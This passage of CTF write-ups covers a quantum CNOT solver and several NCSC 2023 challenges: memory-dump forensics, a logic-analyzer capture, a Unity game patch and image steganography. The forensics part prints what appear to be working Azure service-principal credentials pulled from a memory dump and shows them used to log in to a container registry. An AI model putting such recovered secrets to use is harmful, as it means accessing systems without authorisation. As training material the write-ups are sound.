data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3JhbmlhLW1pZGFvdWktYjAxNjNhMWJiLw==\" data-background-image=\"https://media-exp1.licdn.com/dms/image/C4D03AQHOP8zn9x9nKw/profile-displayphoto-shrink_800_800/0/1643659005590?e=1668643200&v=beta&t=FV5YWMygs2bbclfvgFIUtPgjIedq8tGiKWxopxK2_yU\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3JhbmlhLW1pZGFvdWktYjAxNjNhMWJiLw==\">Writeup Author - Mida0ui</span>\n          <p class=\"desc\">Mida0ui Linkedin Profile</p>\n          </div></div></div>\n<p>The description mentions that we’re dealing with a quantum computer with two qubits, se we can assume that the gate the person used to get the output is a two-qubit quantum logic gate.</p>\n<p>A quantum gate is basic quantum circuit operating on a small number of qubits, they perform operations to change the state of the qubits, and unlike many classical logic gates, quantum logic gates are reversible.<br>\nEach quantum gate has its matrix, and since the qubit states are represented with vectors, the gates transform these vectors to get new states.<br>\nThe state vectors of the states |0&gt; and |1&gt; are:</p>\n<p><img data-src=\"https://user-images.githubusercontent.com/68945305/190504993-8094b514-dfa2-472f-8622-59867ef2e061.png\" alt=\"2022-09-15_19h32_37\"></p>\n<p>The CNOT gate was applied, it’s a two-qubit quantum gate that performs a controlled NOT where one qubit is the control and the second qubit is the target.<br>\nIts matrix is the following :</p>\n<p><img data-src=\"https://user-images.githubusercontent.com/68945305/190486028-970479de-3ff1-415e-bdd2-b4f0e6c8dab2.png\" alt=\"2022-09-15_19h33_11\"></p>\n<p>When applied:</p>\n<p><img data-src=\"https://user-images.githubusercontent.com/68945305/190497970-bd14060b-e413-43b6-982a-17da2d1c18a5.png\" alt=\"2022-09-15_20h47_02\"></p>\n<p>The mathematics behind these results are simple:</p>\n<p>Lets take |10&gt; and |11&gt;:</p>\n<p><img data-src=\"https://user-images.githubusercontent.com/68945305/190505635-f998a0df-a328-4230-a3f1-1e3be73a5cef.png\" alt=\"2022-09-15_21h46_45\"></p>\n<p>This ⊗ represents a tensor product, you can read about it here if you don’t know what it is : <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWF0aDNtYS5jb20vYmxvZy90aGUtdGVuc29yLXByb2R1Y3QtZGVteXN0aWZpZWQ=\">https://www.math3ma.com/blog/the-tensor-product-demystified</span></p>\n<p>The first qubit is usually referred to as the control qubit and the second qubit as the target qubit. Expressed in basis states, the CNOT gate:<br>\nleaves the control qubit unchanged and performs a Pauli-X gate or NOT gate (which just flips the state of the qubit) on the target qubit when the control qubit is in state ∣1⟩;<br>\nleaves the target qubit unchanged when the control qubit is in state ∣0⟩.</p>\n<p>As you may have noticed, this challenge can be done manually by converting the output string to binary, taking two bits at a time and checking the value of the most significant bit, if it’s 1, the other bit is flipped, else, nothing is done.</p>\n<p>I wanted to solve this task with the CNOT gate itself,using the qiskit module in python.<br>\nQiskit is an open-source SDK for working with quantum computers at the level of pulses, circuits, and application modules.</p>\n<p>As mentioned before quantum logic gates are reversible, in this case, when CNOT gate is applied once on the output, we get the flag.</p>\n<p>Here’s the script, you can run it on jupyter notebook:</p>\n<figure class=\"highlight py\"><figcaption><span>Solver</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> qiskit <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">output = <span class=\"string\">&#x27;wxqvn$Zae$&#123;deyZv$d&quot;i&#x27;</span></span><br><span class=\"line\">output_array = <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">format</span>(i, <span class=\"string\">&#x27;08b&#x27;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">bytearray</span>(output, encoding =<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">bin_flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">state_vect</span>(<span class=\"params\">bit</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(bit == <span class=\"string\">&#x27;0&#x27;</span>):</span><br><span class=\"line\">        vect = [<span class=\"number\">1</span>, <span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">else</span> : </span><br><span class=\"line\">        vect = [<span class=\"number\">0</span> ,<span class=\"number\">1</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> vect</span><br><span class=\"line\"></span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i&lt;<span class=\"built_in\">len</span>(output_array):</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#Initialize the quantum circuit</span></span><br><span class=\"line\">    q = QuantumRegister(<span class=\"number\">2</span>, <span class=\"string\">&quot;q&quot;</span>)</span><br><span class=\"line\">    c = ClassicalRegister(<span class=\"number\">2</span>, <span class=\"string\">&quot;c&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    qc = QuantumCircuit(q,c)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#get the initial state from the output</span></span><br><span class=\"line\">    vect0 = state_vect(output_array[i])</span><br><span class=\"line\">    vect1 = state_vect(output_array[i+<span class=\"number\">1</span>])</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#initialize the register</span></span><br><span class=\"line\">    qc.initialize(vect1,<span class=\"number\">0</span>)</span><br><span class=\"line\">    qc.initialize(vect0,<span class=\"number\">1</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    qc.measure(q, c)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#apply the CNOT gate, q[1] is the control and q[0] is the target</span></span><br><span class=\"line\">    qc.cx(q[<span class=\"number\">1</span>],q[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    qc.measure(q, c)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#execute the circuit</span></span><br><span class=\"line\">    qobj = assemble(qc, shots=<span class=\"number\">1</span>)</span><br><span class=\"line\">    job = execute(qc,Aer.get_backend(<span class=\"string\">&#x27;qasm_simulator&#x27;</span>),shots=<span class=\"number\">1</span>)</span><br><span class=\"line\">    counts = job.result().get_counts()</span><br><span class=\"line\">    </span><br><span class=\"line\">    bin_flag += <span class=\"built_in\">str</span>(counts)[<span class=\"number\">2</span>:<span class=\"number\">4</span>]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#Increment the counter to get the next 2 qubits</span></span><br><span class=\"line\">    i=i+<span class=\"number\">2</span></span><br><span class=\"line\">    </span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bin_flag[i*<span class=\"number\">8</span>:i*<span class=\"number\">8</span>+<span class=\"number\">8</span>],<span class=\"number\">2</span>)) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(bin_flag)//<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n<p>The flag is  <code>flag&#123;4_qu4ntum_g4t3&#125;</code></p>\n"},{"title":"NCSC'2023 Writeup Challenges","date":"2023-03-23T10:33:37.000Z","cover":"https://imgur.com/LJslRYb.png","_content":"\nThe National Cyber Security Congress (NCSC) is a three-day event that brings together cyber security enthusiasts and experts. The event features a wide range of activities, including workshops, talks, conferences, and two exciting CTF competitions.\n\n![](https://imgur.com/LJslRYb.png)\n\nAs a technical team member, I had the chance to create challenges in Kubernetes, Digital Forensics, Misc, Hardware, and Game Hacking categories.\n\n\nThe NCSC CTF provided a unique opportunity for cyber security enthusiasts to demonstrate their problem-solving abilities, teamwork, and technical proficiency in a fun and competitive environment. Overall, the event was an exciting and rewarding experience for all involved.\n\nIn this blog, I will share some write-ups that players have requested!\n\n# Digital Forensics : Mokni & Seals \n\n![](https://i.imgur.com/i231apB.png)\n\nWe got a zip file! I bet that file is a memory dump! So i tried to run the volatility imageinfo plugin but it takes a long time. So I tried to figure out if this file is Linux memory dump or not! \n\n```bash linux or win ? \nraf@4n6nk8s: strings data.raw | grep \"Linux version\" \nLinux version 5.8.0-43-generic (buildd@lcy01-amd64-018) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) 49~20.04.1-Ubuntu SMP Fri Feb 5 09:57:56 UTC 2021 (Ubuntu 5.8.0-43.49~20.04.1-generic 5.8.18)\n```\nAnd yes it's a Linux Memory dump! I guess its time to start finding/making a profile but let me check that is memory dump can be analyzed with a profile or not! \n\n```bash checking\nstrings data.raw | grep -i insmod       \nsudo insmod ./lime-5.8.0-43-generic.ko path=../../Linux64.mem format=raw\nsudo insmod ./lime-5.8.0-43-generic.ko \"path=../../Linux64.mem format=raw\"\nsudo insmod ./lime-5.8.0-43-generic.ko \"path=../../Linux64.mem format=raw\"\n```\nOh! The format is ram! which means that even if we get the correct profile volatility can't analyze this memory dump! Strings time! The author want us to solve this mem dump using strings !\n\nLet's try to figure out some command lines! Bash history! Let me show you this trick! \n\n```bash extract bash history \nstrings data.raw | grep -Ei \"@*:~\\\\$\"     \nraf-square@ubuntu:~$ vim /etc/containers/registries.conf\nraf-square@ubuntu:~$\nraf-square@ubuntu:~$ echo \"This Is My Secret\" > secret.txt\nraf-square@ubuntu:~$\nraf-square@ubuntu:~$ podman login -u $(head -n 2 secret.txt | tail -n 1 | awk '{ print $4 }') -p $(head -n 3 secret.txt | tail -n 1 | awk '{ print $4 }')\nraf-square@ubuntu:~$ podman pull nginx\n^Craf-square@ubuntu:~$ cd LiME/src/\nraf-square@ubuntu:~$ vim /etc/containers/registries.conf\nraf-square@ubuntu:~$\nraf-square@ubuntu:~$ vim /etc/containers/registries.conf\nraf-square@ubuntu:~$\nu:~$ podman login -u $(head -n 2 secret.txt | tail -n 1 | awk '{ print $4 }') -p $(head -n 3 secret.txt | tail -n 1 | awk '{ print $4 }')\n```\nMmmm nice! now at least we got some commands and we got the user-name and host-name !\nFrom these commands we can understand that the user edit `/etc/containers/registries.conf`, then create a `secret.txt`. Then logged in with podman using that secret.txt. But we don't have any information about the content of the creds in these commands!.\n\nWe have 2 methods to figure out what's happen and get the creds! \n\neither running a strings and grepping on `CMDLINE=podman login` or grepping on `This Is My Secret` and check the lines before and after to see the content! \n\n```bash extract creds\nstrings data.raw | grep -Ei \"CMDLINE=podman login\"       \n_CMDLINE=podman login -u 2ecf92b1-83a8-4355-8cb7-8354f4677894 -p fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb\n```\n\nOR \n\n```bash extract creds\nstrings data.raw | grep -Ei -C 2 \"This Is My Secret\" \n Documents  LiME         Music     Public      Templates\nDesktop  Downloads  Linux64.mem  Pictures  secret.txt  Videos\nraf-square@ubuntu:~$ echo \"This Is My Secret\" > secret.txt\nraf-square@ubuntu:~$\nfctt\n--\napplication/octet-stream\ntext/plain\nThis Is My Secret\nService principal ID: 2ecf92b1-83a8-4355-8cb7-8354f4677894\nService principal password: fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb\n--\n```\n\nSo the creds are `2ecf92b1-83a8-4355-8cb7-8354f4677894:fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb`\n\nBut I didn't think this is a normal creds for `dockerhub` or any public famous container registry! Espacially he pulled a container named nginx! I bet that nginx is a customized one and its a trick! \n\nEditing `/etc/containers/registries.conf` can confirm that change something! This configuration file used by the container runtime environment on Linux systems. This file specifies a list of container image registries that are trusted by the system and can be used to download container images.\n\nSo let's discover how to get the registry! Pulling nginx means he pulled the latest tag or at least he tried that! So let's grep on `nginx:latest`\n\n```bash extract registry\nstrings data.raw | grep -Ei \"nginx:latest\"  \nTrying to pull qualsk8s.azurecr.io/nginx:latest...\nTrying to pull qualsk8s.azurecr.io/nginx:latest...\n\", \"qualsk8s.azurecr.io/nginx:latest\") not found\nTrying to pull qualsk8s.azurecr.io/nginx:latest...\nTrying to pull qualsk8s.azurecr.io/nginx:latest...\nTrying to pull qualsk8s.azurecr.io/nginx:latest...\n```\n\nBingo! `qualsk8s.azurecr.io` is the container registry! If you are an Azure guy you can get that from the previous step! when we get this output!\n\n``` text creds\nService principal ID: 2ecf92b1-83a8-4355-8cb7-8354f4677894\nService principal password: fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb\n```\n\nOk it's time to login and pull that image and run it! \n\n```bash login and pull\ndocker login qualsk8s.azurecr.io -u 2ecf92b1-83a8-4355-8cb7-8354f4677894 -p fwO8Q~XTlBmpYoG43J~OusANA_azV02ZS3PuzaXb \n\ndocker pull nginx\n```\n\nAfter checking the image! I got that it's a static web page so let's run it!\n\n```bash run nginx\ndocker run --name chall -p 80:80 -d nginx \n```\nAfter running this container we got this web-page and guess what!! There is a flag icon! Let's check it !\n![](https://i.imgur.com/q3GSPiL.png)\n\nThis flag icon lead you to this link `https://pastebin.com/vjFtjMga` which is protected pastebin\nhow to get that password now! Let's check the docker history! \n\n```bash docker history\nmohamed@RafSquare:~$ docker history qualsk8s.azurecr.io/nginx\nIMAGE          CREATED       CREATED BY                                      SIZE      COMMENT\n093f65335d3a   13 days ago   ENTRYPOINT [\"nginx\" \"-g\" \"daemon off;\"]         0B        buildkit.dockerfile.v0\n<missing>      13 days ago   RUN /bin/sh -c chmod +r -R . # buildkit         563kB     buildkit.dockerfile.v0\n<missing>      13 days ago   RUN /bin/sh -c mv password.txt .hidden.txt #…   11B       buildkit.dockerfile.v0\n<missing>      13 days ago   COPY ./ ./ # buildkit                           563kB     buildkit.dockerfile.v0\n<missing>      3 weeks ago   RUN /bin/sh -c rm -rf ./* # buildkit            0B        buildkit.dockerfile.v0\n<missing>      3 weeks ago   WORKDIR /usr/share/nginx/html                   0B        buildkit.dockerfile.v0\n<missing>      5 weeks ago   /bin/sh -c set -x     && apkArch=\"$(cat /etc…   29.2MB\n<missing>      5 weeks ago   /bin/sh -c #(nop)  ENV NJS_VERSION=0.7.9        0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  CMD [\"nginx\" \"-g\" \"daemon…   0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  STOPSIGNAL SIGQUIT           0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  EXPOSE 80                    0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  ENTRYPOINT [\"/docker-entr…   0B\n<missing>      5 weeks ago   /bin/sh -c #(nop) COPY file:e57eef017a414ca7…   4.62kB\n<missing>      5 weeks ago   /bin/sh -c #(nop) COPY file:abbcbf84dc17ee44…   1.27kB\n<missing>      5 weeks ago   /bin/sh -c #(nop) COPY file:5c18272734349488…   2.12kB\n<missing>      5 weeks ago   /bin/sh -c #(nop) COPY file:7b307b62e82255f0…   1.62kB\n<missing>      5 weeks ago   /bin/sh -c set -x     && addgroup -g 101 -S …   4.45MB\n<missing>      5 weeks ago   /bin/sh -c #(nop)  ENV PKG_RELEASE=1            0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  ENV NGINX_VERSION=1.23.3     0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  LABEL maintainer=NGINX Do…   0B\n<missing>      5 weeks ago   /bin/sh -c #(nop)  CMD [\"/bin/sh\"]              0B\n<missing>      5 weeks ago   /bin/sh -c #(nop) ADD file:40887ab7c06977737…   7.05MB\n```\nAnd yes!! There is `.hidden.txt` that contain a password for sure ! let's get that password! \n\n```bash docker exec \ndocker exec -it 460fc5a977c5 cat .hidden.txt\nvT56X19Qu3\n```\nWe got this pastebin !\n\n![](https://i.imgur.com/N4B9j4z.png)\n\nThis is will lead us to word sheet that contains a hex data! \n\n![](https://i.imgur.com/P0hrYhX.png)\n\nThe hex data seams introducing spaces and tabs! I don't care let's decode it and see what's will be! \nI'll try to convert it to a file using `xxd` and import that file to dcode.fr \n\n```bash xxd\nxxd -r -p hex.txt > result.txt\n```\n\nYeah it's a file that contains a lot of spaces! Its whitespaces \n\nBingo! This is the flag `Securinets{208e5976c9d654e47d73ef44cabc272d}`\n\n\n\n# Digital Forensics: Recover my Work :(\n\n![](https://i.imgur.com/DWMzUMB.png)\n\nWe got a file named `memory.dmp`. It's a memory dump for sure! Let's run imageinfo plugin to get our profile! \n``` bash profile \nvol.py -f memory.dmp imageinfo\nVolatility Foundation Volatility Framework 2.6.1\nINFO    : volatility.debug    : Determining profile based on KDBG search...\nWARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow\nWARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow\nWARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow\nWARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow\n```\n\nBut sadly we got this type of outpût! I bet that the suggested profile (in case it exists) will be wrong! Let's know the exact profile with my own way! Let's run strings the file and grep \"service pack\"\n\n``` text Extract info\nWindows 7 Professional, 64-bit Service Pack 1 (Build 7601)\n```\n\nCool, This build and service pack is supported by `Win7SP1x64`! I guess that imageinfo plugin got problem because the iso is customizated !\n\nLet's start checking our memory dump! First thing should be checked is the running processes! I'll use pstree for that thing!\n\n![](https://i.imgur.com/1xA56pZ.png)\n\nMMMM intersting! Found chrome, firefox, outlook and RDP opened! what a trip! After digging on chrome history and firefox, I found rabbit holes and some links to wordlists! Bad Author (Me). \n\nChecking the consoles plugin too. Another rabbit hole! rabbit hole everywhere! \n\nIt's time to check and figure out that outlook process!\nOutlook save the mails as pst or ost files! These files contains the mails data such as the message, attachements, sender/receiver information! \n\nSo let's try to extract these files ! \n\n```bash check files \nvol.py -f memory.dmp --profile=Win7SP1x64 filescan | grep -i pst$\n0x000000007d81a490      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Outlook.pst\n0x000000007dd59340      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Work Progress.pst\n0x000000007dd73220      1      0 R--rw- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Work Progress.pst\n0x000000007e3f8b30      5      5 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Forgot the password.pst\n0x000000007e5297a0      1      0 R--rw- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Forgot the password.pst\n0x000000007e5eee60     30      0 RW-r-- \\Device\\HarddiskVolume2\\Users\\Raf_Square\\AppData\\Local\\Microsoft\\Outlook\\Outlook.pst\n```\nAfter extracting the files using `dumpfiles` plugin and making sure that the files are safe and not corrupted. I opened them using a pst online viewer! \n\nThe 1st mail i got it is from Adam! He send to me a zip file inside mega storage after our online meeting! I bet that zip is protected with that boring password\n\n![](https://i.imgur.com/9a0GCzz.png)\n\nAh my bad! The mega too is protected! We need the encryption key! \n\n![](https://i.imgur.com/hEG0dsu.png)\n\nLet's check the other mail! and as expected Adam forget to share the decryption key of the mega link to open the zip! \n\n![](https://i.imgur.com/wB3m3QV.png)\n\nBingo we got the zip! But it's protected! Tried bruteforcing the password. But I failed! \n\nMmmm Let's think a little bit! The author said that he used to use the same password! We need to find another usage of that password to open the zip and get the flag! \n\nAnd It's time to investigate the `mstsc.exe` or let's just say the RDP! Remote Desktop?? Mmmm how to extract information from that thing?\n\nLet's talk brievly! Extracting the memory part used by RDP can save our life! I'll try to recover what the user see when he used RDP!!!! \n\nYes this possible dear reader, Don't worry You'll see how! Just make sure that you have `Gimp`\n\nLet's now extract the memory part used by RDP process using the `memdump` plugin in volatility! \n\n``` bash memdump\nvol.py -f memory.dmp --profile=Win7SP1x64 memdump -p 360 -D .\nVolatility Foundation Volatility Framework 2.6.1\n************************************************************************\nWriting mstsc.exe [   360] to 360.dmp\n```\n\nAfter getting that file! Let's change its extension from `.dmp` to `.data` and open that file with gimp! \n\n![](https://i.imgur.com/k3uwJ0M.png)\n\nNow it's time for focusing! Yeah focusing will save your time! Many people can't figure or recover images quickly! But believe me focusing on the noise will help you recover the data in a short time! \n\nAfter 4 mins of playing with offset and width i got it! \n\nCheck the offset and the width!\n\n![](https://i.imgur.com/wI2SQK7.png)\n\nOhhh man! The user was opened [https://ctf.securinets.tn](https://ctf.securinets.tn) (check it for know more information about our CTFs events xD ) and tried to secure a zip file with that shitty password! \n\nFinally This is the flag `Securinets{R3M0tE_DeSKtOp_1s_FunNy_!_!}`\n\n# Hardware: Liquid Display\n\n![](https://i.imgur.com/YVrQJqG.png)\n\nWe got an image and a data file! \n![](https://i.imgur.com/5Enx08x.png)\n\nThe image contains an LCD 16x2 SPI connected to something called `WOKWI LOGIC`\n\nAfter some searching I got that this component is a logic analyzer. But wait!! What is that?? \n\nA logic analyzer is an electronic instrument that captures and displays multiple signals from a digital system or digital circuit. A logic analyzer may convert the captured data into timing diagrams, protocol decodes, state machine traces...\n\n![](https://imgur.com/WEzP4bO.png)\n\nAs my friend said this is the hardware wireshark xD\n\nSo we can understand now that this circuit capture the signals of each pin of the LCD and the data file is the capture file that contains the files! \n\nSo after some searching we get how to open that data file (which is a ASCII text file, I didn't recommend to analyse it as text file).\n\nYou can check this [link](https://docs.wokwi.com/guides/logic-analyzer) to get more information about the logic analyzer! \n\n[PulseView](https://sigrok.org/wiki/Downloads) is an open source Logic Analyzer GUI belongs to The sigrok project that aims at creating a portable, cross-platform, Free/Libre/Open-Source signal analysis software suite that supports various device types\n\nI'll use that Logic Analyzer GUI for this challenge! \n\n![](https://imgur.com/6HyLxUY.png)\n\nImport the file data in this way! and let's the show begin! \n\n![](https://imgur.com/MLrvWUk.png)\n\nA lot of fun wait us right?! Don't worry man! This is not that super hard! Just all what we need to do now is to simulate these signals manually! These signals are sent to the LCD and that LCD display something (It should be the flag!). So we need to understand how LCD works! I recommend to read the datasheet this thing!\n\nI will not re-write what the datasheet said! so read it! You should understand how the LCD dispaly chars! \n\n![](https://imgur.com/vnZLXyb.png)\n\nAlso don't forget to check the instruction table and understand how these instruction works! \n\n![](https://imgur.com/xsRciDM.png)\n\nLet's just take an example of the 1st instruction! The `Clear Display`. This instruction clear all the data and return the cursor to the original status! Ah yeah of course you must to understand that LCD have cursors, display modes ... \n\nAfter understand how this LCD works it's time to check how characters are written on that LCD!\n\n![](https://imgur.com/5JQEtHj.png)\n\nThis table will help us to convert the signals to chars and recover our flag! \n\nAfter reading the datasheet. You will understand that the D0 (that correspond to RS pin) can help you to understand when the display device clear the chars and reset the cursor or write something on the screen!\n\n![](https://imgur.com/QTfwCZC.png)\n\nIf you take a closer look you'll get it! The guy who write the program write something and clear it then write another thing then delete it and so on! \n![](https://imgur.com/GSgaCKF.png)\n\nSo now it's time to check the write blocks and check what that guy try to do! After reversing all the block i got the flag! It's on the last block! Let me show you how I recover that data! \n\n![](https://imgur.com/HZcwRyX.png)\n\nUsing the characters table you can recover the flag! Mapping the signal and the Big table lead you to the flag!\n\nAnd This is will be our flag! `Securinets{LcD_1s_H4rD_!:(}`\n\n# Game Hacking: Platformer:\n![](https://imgur.com/OAyXmNQ.png)\n\nIn this challenge we have a game made by unity! It's 2D platformer game where the player can jump and run in the map! But where is the flag??\n![](https://imgur.com/oIzwhG8.png)\n\nMmmmm my sixth sense told me that the flag is hidden somewhere in the map and the player can't reach it! Hack Time!!! \n\nLet's change the player ability and let him can move in any place we want it. By disabling the collision and physics mechanism! Good bye gravitiy,Rigidbody,collisions! \n\nTo do this let's open `Assembly-CSharp.dll` located in `Platformer_Data/Managed` folder.\n\nWow! This is the player controller code! that allow the player to move and the animation to be played and responsable for jumping and detect ground detection to deny player to jump many times on the air! \n\n![](https://imgur.com/eD0vAq0.png)\n\nBoring mechanism!! Let me change this shitty code by mine! I'll let the player move to any point he want! \n\n\n![](https://imgur.com/DZqPB6p.png)\nYou can copy that code\n\n```csharp change mechanism\n\tprivate void Start()\n\t{\n\t\tthis.rb = base.GetComponent<Rigidbody2D>();\n\t\tthis.rb.isKinematic = true;\n\t\tthis.anim = base.GetComponent<Animator>();\n\t\tthis.mySpriteRenderer = base.GetComponent<SpriteRenderer>();\n\t}\n\n\t// Token: 0x06000005 RID: 5\n\tprivate void FixedUpdate()\n\t{\n\t\tfloat axisRaw = Input.GetAxisRaw(\"Horizontal\");\n\t\tfloat verticalInput = Input.GetAxisRaw(\"Vertical\");\n\t\tVector3 movement = new Vector3(axisRaw, verticalInput, 0f).normalized * 10f * Time.deltaTime;\n\t\tbase.transform.Translate(movement);\n\t}\n```\n\nAfter applying the changes our player can now go to any place we want! But i didn't find the flag! Oh god! This is what i found!\n![](https://imgur.com/6PRgDFo.png)\n\nI checked all the map and sadly nothing interesting :( \n\nLet's check the files again! Maybe we will find something!\n\n![](https://imgur.com/MZ9tbCH.png)\n\nOh man look here! I found that there is levels on this game! Let me back to the decompiled code! \n\n![](https://imgur.com/yM0C7nL.png)\n\nOh no! The game is opened on the 2nd level! Let's change this room to \"Level1\" and Play again! And yes It's a new Level\n\n![](https://imgur.com/me4efrx.png)\n\nAfter moving right and left, I found the flag! \n\n![](https://imgur.com/gj4wGE9.png)\n\nAnd Yes We did it! Just move right and left and collect the letters ! and you'll get this one ! Wrap it in Securinets{}\n![](https://imgur.com/cpA2O6c.png)\n\nFlag: `Securinets{Gam1ng_AnD_L0VE}`\n\n# Misc: Full Difference\n\n![](https://imgur.com/dROW4SQ.png)\n\nFull Difference, The difference will make a difference! What is that thing ?? we got 2 images with different type but same picture! \n![](https://imgur.com/dr87PxX.png)\n\nThinking a little bit can we understand what the author means! Full difference! It means that the pixels should be different a full difference! which means the Red,Green and Blue channels should be differents! \n\n\"Will make a difference!\" After extracting the different pixels we should calculate the difference between each channels ?? Mmmmm makes sense! \n\n```python solver\nfrom PIL import Image\nimport string \nim1=Image.open(\"tobi.jpg\")\nim2=Image.open(\"tobi.png\")\npix2=im2.load()\npix1=im1.load()\nwidth,height=im1.size\nresult=\"\"\ndata=[]\nfor i in range(0,width):\n    for j in range(0,height):\n        if pix1[i,j] != pix2[i,j] and pix1[i,j][0] != pix2[i,j][0] and pix1[i,j][1] != pix2[i,j][1] and pix1[i,j][2] != pix2[i,j][2]:\n            for k in range(0,3):\n                data.append(chr(abs(pix1[i,j][k] - pix2[i,j][k])))\n\nfor char in data:\n    if char in string.ascii_letters + string.digits + string.punctuation:\n        result+=char\n\n        \nprint(result)\n```\n\nSo the logic behind that code is to extract the pixels that have a full difference then calculate the difference between them. After that we convert the numbers to chars (should be printable!)\n\nThis expression will give us the different pixels \n```python exp\npix1[i,j] != pix2[i,j] and pix1[i,j][0] != pix2[i,j][0] and pix1[i,j][1] != pix2[i,j][1] and pix1[i,j][2] != pix2[i,j][2]\n```\nIn addition this expression collect the result of calculation the diff between the 2 pixels of each image!\n\n```python diff\ndata.append(chr(abs(pix1[i,j][k] - pix2[i,j][k])))\n```\n\nThen it's time to convert it to printable data! \n```python print\nfor char in data:\n    if char in string.ascii_letters + string.digits + string.punctuation:\n        result+=char\n```\nRunning this code will give you this base64 encoding! `dGgxNV8xNV9zaDB1TGRfYjNfaDRyRA==`\n\nBingo we got this statement! `th15_15_sh0uLd_b3_h4rD`. Let's wrap it in Securinets! Oh nooo! Didn't work. I guess the challenge is not finished! \n\nWe have 2 images! PNG and JPEG. Mmmm Let's try to do some steganography on these images using the password/key that we got previously.\n\nThe 1st idea in my mind is to try steghide! Nothing else! Let's try it \n\n![](https://imgur.com/VLbBAGf.png)\n\nYEEES MAAN! We got a flag.zip file! But wait it's protected again :(. I tried to brute force that thing using rockyou but failed !!! What is going on here! The flag is inside that zip what we should to do now! \n\nLet's extract more information about the zip using `7z` utility\n```bash 7z\n7z l  -slt flag.zip\n\nPath = flag.txt\nFolder = -\nSize = 40\nPacked Size = 52\nModified = 2022-11-18 21:17:23\nCreated =\nAccessed =\nAttributes = A\nEncrypted = +\nComment =\nCRC = 